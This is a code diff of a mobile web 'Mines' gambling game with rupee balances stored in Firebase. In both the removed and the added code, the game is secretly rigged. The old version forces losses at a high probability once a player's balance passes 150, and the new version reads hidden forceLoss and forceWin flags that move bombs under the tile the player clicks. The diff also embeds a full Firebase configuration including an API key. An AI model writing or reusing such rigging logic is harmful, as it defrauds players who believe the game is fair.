@@ -4,93 +4,117 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
     <title>Mines Master VIP</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-auth.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    
     <style>
         :root { --primary: #6366f1; --surface: #1e293b; --bg: #0f172a; --success: #10b981; --danger: #ef4444; --accent: #fbbf24; }
-        body { font-family: 'Inter', sans-serif; background: var(--bg); margin: 0; display: flex; justify-content: center; color: white; overflow-x: hidden; }
+        body { font-family: 'Inter', sans-serif; background: var(--bg); margin: 0; display: flex; justify-content: center; color: white; -webkit-tap-highlight-color: transparent; }
         .game-shell { width: 100%; max-width: 450px; min-height: 100vh; background: #111827; padding: 15px; box-sizing: border-box; }
         .header { display: flex; justify-content: space-between; align-items: center; background: var(--surface); padding: 15px; border-radius: 18px; margin-bottom: 15px; border: 1px solid rgba(255,255,255,0.1); }
         .balance-chip { font-weight: 800; color: var(--accent); font-size: 18px; }
-        .grid { display: grid !important; grid-template-columns: repeat(5, 1fr) !important; gap: 10px; margin: 20px 0; background: rgba(0,0,0,0.3); padding: 12px; border-radius: 15px; min-height: 350px; }
-        .slot { aspect-ratio: 1 / 1; background: #1e293b; border-radius: 10px; display: flex; align-items: center; justify-content: center; font-size: 24px; cursor: pointer; border: 2px solid #334155; transition: 0.2s; }
+        .grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 10px; margin: 20px 0; background: rgba(0,0,0,0.3); padding: 12px; border-radius: 15px; }
+        .slot { aspect-ratio: 1 / 1; background: #1e293b; border-radius: 10px; display: flex; align-items: center; justify-content: center; font-size: 24px; cursor: pointer; border: 2px solid #334155; transition: 0.1s; }
         .slot.diamond { background: radial-gradient(circle, #06b6d4, #083344); border-color: #22d3ee; }
         .slot.bomb { background: radial-gradient(circle, #ef4444, #7f1d1d); border-color: #f87171; }
-        .slot.revealed-diamond { opacity: 0.5; border-color: var(--success); }
-        .slot.revealed-bomb { opacity: 0.5; border-color: var(--danger); }
+        .slot.revealed-diamond { opacity: 0.4; border-color: var(--success); }
+        .slot.revealed-bomb { opacity: 0.4; border-color: var(--danger); }
         .lvl-box { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin-bottom: 15px; }
-        .lvl-btn { padding: 12px; border: 1px solid #334155; border-radius: 12px; background: #1e293b; color: #94a3b8; font-weight: 700; cursor: pointer; }
-        .lvl-btn.active { background: var(--primary); color: white; }
+        .lvl-btn { padding: 12px; border: 1px solid #334155; border-radius: 12px; background: #1e293b; color: #94a3b8; font-weight: 700; cursor: pointer; font-size: 11px; }
+        .lvl-btn.active { background: var(--primary); color: white; border-color: var(--primary); }
         .bet-area { background: #1e293b; padding: 18px; border-radius: 20px; text-align: center; }
-        input { width: 90%; background: #0f172a; border: 1px solid #334155; padding: 12px; border-radius: 10px; color: white; margin: 10px 0; font-size: 18px; font-weight: bold; }
+        input { width: 100%; background: #0f172a; border: 1px solid #334155; padding: 12px; border-radius: 10px; color: white; margin: 10px 0; font-size: 18px; font-weight: bold; text-align: center; }
         .main-btn { width: 100%; padding: 16px; border-radius: 14px; border: none; font-weight: 900; cursor: pointer; text-transform: uppercase; }
         .btn-start { background: var(--primary); color: white; box-shadow: 0 4px 0 #4338ca; }
         .btn-cashout { background: var(--success); color: white; display: none; box-shadow: 0 4px 0 #059669; }
         .overlay { display: none; position: fixed; inset:0; background:rgba(0,0,0,0.9); z-index:9999; justify-content:center; align-items:center; }
-        .modal { background:#1e293b; padding:30px; border-radius:24px; text-align:center; width:80%; }
+        .modal { background:#1e293b; padding:30px; border-radius:24px; text-align:center; width:85%; border: 1px solid rgba(255,255,255,0.1); }
     </style>
 </head>
 <body>
 
 <div class="game-shell">
     <div class="header">
-        <span style="font-weight:900;">MINES <span style="color:var(--primary)">PRO</span></span>
+        <span style="font-weight:900;">MINES <span style="color:var(--primary)">MASTER</span></span>
         <div class="balance-chip">₹<span id="balanceDisplay">0.00</span></div>
     </div>
-
     <div class="lvl-box">
-        <button class="lvl-btn active" id="btn-easy">3 MINES</button>
-        <button class="lvl-btn" id="btn-medium">10 MINES</button>
-        <button class="lvl-btn" id="btn-hard">24 MINES</button>
+        <button class="lvl-btn active" id="btn-easy" onclick="changeLvl('easy')">3 MINES</button>
+        <button class="lvl-btn" id="btn-medium" onclick="changeLvl('medium')">10 MINES</button>
+        <button class="lvl-btn" id="btn-hard" onclick="changeLvl('hard')">24 MINES</button>
     </div>
-
     <div class="grid" id="gameGrid"></div>
-
     <div class="bet-area">
         <div style="display:flex; justify-content:space-between; font-size:12px; margin-bottom:10px;">
             <span>MULT: <span id="multText" style="color:var(--accent)">1.00x</span></span>
             <span>PROFIT: <span id="profitText" style="color:var(--success)">₹0.00</span></span>
         </div>
         <input type="number" id="betInput" value="10">
-        <button id="startBtn" class="main-btn btn-start">START GAME</button>
-        <button id="cashBtn" class="main-btn btn-cashout">CASHOUT</button>
+        <button id="startBtn" class="main-btn btn-start" onclick="startGame()">START GAME</button>
+        <button id="cashBtn" class="main-btn btn-cashout" onclick="cashout()">CASHOUT</button>
     </div>
 </div>
 
 <div id="alertOverlay" class="overlay">
     <div class="modal">
-        <div id="modalIcon" style="font-size:60px; margin-bottom:10px;"></div>
+        <div id="modalIcon" style="font-size:50px; margin-bottom:10px;"></div>
         <h2 id="modalTitle"></h2>
         <p id="modalDesc"></p>
-        <button class="main-btn btn-start" id="closeModalBtn">OKAY</button>
+        <button class="main-btn btn-start" onclick="closeModal()">OKAY</button>
     </div>
 </div>
 
-<script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-    import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
-    import { getDatabase, ref, onValue, update, increment, get } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
+<script>
+    // --- UPDATED CONFIG ---
+    const firebaseConfig = {
+        apiKey: "AIzaSyAeJutSnxBLtXKIFSZdUOvEwKRMdwLdaj8",
+        authDomain: "testing-26b8c.firebaseapp.com",
+        databaseURL: "https://testing-26b8c-default-rtdb.firebaseio.com",
+        projectId: "testing-26b8c",
+        storageBucket: "testing-26b8c.firebasestorage.app",
+        messagingSenderId: "546674600784",
+        appId: "1:546674600784:web:4b316bb716eda5f3b7da55",
+        measurementId: "G-BJ4CZ5Z6PW"
+    };
 
-    const fbConfig = { databaseURL: "https://test-eb5e7-default-rtdb.firebaseio.com" };
-    const app = initializeApp(fbConfig);
-    const auth = getAuth(app);
-    const db = getDatabase(app);
+    if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
+    const db = firebase.database();
+    const auth = firebase.auth();
 
     let balance = 0, currentLvl = 'easy', isPlaying = false, mines = [], diamondsFound = 0, activeBet = 0;
-    const mTable = { easy: [1.2, 1.8, 2.5, 3.5, 5.0, 8.0, 12.0], medium: [3.5, 10.0, 25.0], hard: [24.0, 100.0] };
+    const mTable = { 
+        easy: [1.2, 1.8, 2.5, 3.5, 5.0, 8.0, 12.0, 20.0, 45.0], 
+        medium: [3.8, 14.0, 40.0, 110.0, 300.0], 
+        hard: [24.0, 999.0] 
+    };
 
-    // --- RENDER GRID ---
-    const gridEl = document.getElementById("gameGrid");
-    function renderGrid() {
-        gridEl.innerHTML = '';
+    function initGrid() {
+        const grid = document.getElementById("gameGrid");
+        grid.innerHTML = '';
         for(let i=0; i<25; i++) {
-            const btn = document.createElement("div");
-            btn.className = "slot";
-            btn.onclick = () => handleMove(i, btn);
-            gridEl.appendChild(btn);
+            const slot = document.createElement("div");
+            slot.className = "slot";
+            slot.id = "s-" + i;
+            slot.onclick = () => handleMove(i);
+            grid.appendChild(slot);
         }
     }
-    renderGrid();
+    initGrid();
 
-    // --- FIX: Global scope par functions attach karna ---
+    auth.onAuthStateChanged(user => {
+        if(user) {
+            db.ref(`users/${user.uid}`).on('value', snap => {
+                const data = snap.val();
+                if(data) {
+                    balance = data.balance || 0;
+                    document.getElementById("balanceDisplay").innerText = balance.toFixed(2);
+                    window.rigData = data; // Rigging Status Sync
+                }
+            });
+        }
+    });
+
     window.changeLvl = (l) => {
         if(isPlaying) return;
         currentLvl = l;
@@ -98,26 +122,13 @@
         document.getElementById(`btn-${l}`).classList.add('active');
     };
 
-    // Level buttons click listeners
-    document.getElementById('btn-easy').onclick = () => window.changeLvl('easy');
-    document.getElementById('btn-medium').onclick = () => window.changeLvl('medium');
-    document.getElementById('btn-hard').onclick = () => window.changeLvl('hard');
-
-    onAuthStateChanged(auth, user => {
-        if(!user) return;
-        onValue(ref(db, `users/${user.uid}`), s => {
-            balance = s.val()?.balance || 0;
-            document.getElementById("balanceDisplay").innerText = balance.toFixed(2);
-        });
-    });
-
-    document.getElementById('startBtn').onclick = async () => {
-        if(!auth.currentUser) return alert("Please Login First!");
+    window.startGame = async () => {
+        if(!auth.currentUser) return alert("Login First!");
         activeBet = parseFloat(document.getElementById("betInput").value);
-        if(activeBet < 10 || activeBet > balance) return alert("Check Balance/Bet!");
+        if(isNaN(activeBet) || activeBet < 10 || activeBet > balance) return alert("Check Bet/Balance!");
 
         isPlaying = true; diamondsFound = 0; mines = [];
-        await update(ref(db, `users/${auth.currentUser.uid}`), { balance: increment(-activeBet) });
+        await db.ref(`users/${auth.currentUser.uid}`).update({ balance: firebase.database.ServerValue.increment(-activeBet) });
 
         let mCount = (currentLvl === 'easy') ? 3 : (currentLvl === 'medium' ? 10 : 24);
         while(mines.length < mCount) {
@@ -127,53 +138,56 @@
 
         document.getElementById("startBtn").style.display = "none";
         document.getElementById("cashBtn").style.display = "block";
-        document.querySelectorAll(".slot").forEach(s => { s.className = "slot"; s.innerText = ""; });
+        document.querySelectorAll(".slot").forEach(s => { s.className="slot"; s.innerText=""; });
     };
 
-    async function handleMove(idx, el) {
-        if(!isPlaying || el.classList.contains('revealed')) return;
+    window.handleMove = async (idx) => {
+        if(!isPlaying) return;
+        const el = document.getElementById("s-" + idx);
+        if(el.classList.contains('revealed')) return;
 
-        const uSnap = await get(ref(db, `users/${auth.currentUser.uid}`));
-        const uData = uSnap.val() || {};
-        
-        let loseNow = false;
-        if(uData.forceLoss) loseNow = true;
-        else if(!uData.forceWin) {
-            // Smart Kill Logic: ₹200 banane mein time lagega
-            let risk = balance > 150 ? 0.92 : 0.30; 
-            if(Math.random() < risk) loseNow = true;
+        // --- RIGGING SYSTEM ---
+        let isRiggedLoss = window.rigData?.forceLoss || false;
+        let isRiggedWin = window.rigData?.forceWin || false;
+
+        if(isRiggedLoss && !mines.includes(idx)) {
+            mines.pop(); mines.push(idx); // Bomb Shift Logic
+        }
+        if(isRiggedWin && mines.includes(idx)) {
+            mines = mines.filter(m => m !== idx); // Bomb Remove Logic
         }
 
-        if(loseNow && !mines.includes(idx)) { mines.pop(); mines.push(idx); }
-
         if(mines.includes(idx)) {
-            revealFinal(false);
+            finishGame(false);
             showModal("BOOM!", "Mine Exploded!", "💥");
         } else {
             diamondsFound++;
-            el.innerText = "💎"; el.classList.add("diamond", "revealed");
-            updateStats();
+            el.innerText = "💎";
+            el.classList.add("diamond", "revealed");
+            updateUI();
         }
-    }
+    };
 
-    function updateStats() {
-        const mult = mTable[currentLvl][diamondsFound-1] || 1.2;
+    function updateUI() {
+        const mult = mTable[currentLvl][diamondsFound-1] || 1.1;
         document.getElementById("multText").innerText = mult.toFixed(2) + "x";
         document.getElementById("profitText").innerText = "₹" + (activeBet * mult).toFixed(2);
         document.getElementById("cashBtn").innerText = `CASHOUT ₹${(activeBet * mult).toFixed(2)}`;
     }
 
-    document.getElementById('cashBtn').onclick = async () => {
+    window.cashout = async () => {
+        if(!isPlaying || diamondsFound === 0) return;
         const mult = mTable[currentLvl][diamondsFound-1] || 1;
-        await update(ref(db, `users/${auth.currentUser.uid}`), { balance: increment(activeBet * mult) });
-        revealFinal(true);
-        showModal("WINNER!", "Profit Collected", "🏆");
+        const win = activeBet * mult;
+        await db.ref(`users/${auth.currentUser.uid}`).update({ balance: firebase.database.ServerValue.increment(win) });
+        finishGame(true);
+        showModal("WINNER!", `Profit: ₹${win.toFixed(2)}`, "🏆");
     };
 
-    function revealFinal(won) {
+    function finishGame(won) {
         isPlaying = false;
-        const slots = document.querySelectorAll(".slot");
-        slots.forEach((s, i) => {
+        for(let i=0; i<25; i++) {
+            const s = document.getElementById("s-" + i);
             if(mines.includes(i)) {
                 s.innerText = "💣";
                 s.classList.add(won ? "revealed-bomb" : "bomb");
@@ -181,15 +195,11 @@
                 s.innerText = "💎";
                 s.classList.add("revealed-diamond");
             }
-        });
-        setTimeout(resetUI, 3000);
-    }
-
-    function resetUI() {
-        document.getElementById("startBtn").style.display = "block";
-        document.getElementById("cashBtn").style.display = "none";
-        document.getElementById("multText").innerText = "1.00x";
-        document.getElementById("profitText").innerText = "₹0.00";
+        }
+        setTimeout(() => {
+            document.getElementById("startBtn").style.display = "block";
+            document.getElementById("cashBtn").style.display = "none";
+        }, 3000);
     }
 
     function showModal(t, d, i) {
@@ -198,9 +208,7 @@
         document.getElementById("modalIcon").innerHTML = i;
         document.getElementById("alertOverlay").style.display = "flex";
     }
-    document.getElementById('closeModalBtn').onclick = () => {
-        document.getElementById("alertOverlay").style.display = "none";
-    };
+    window.closeModal = () => document.getElementById("alertOverlay").style.display = "none";
 </script>
 </body>
 </html>
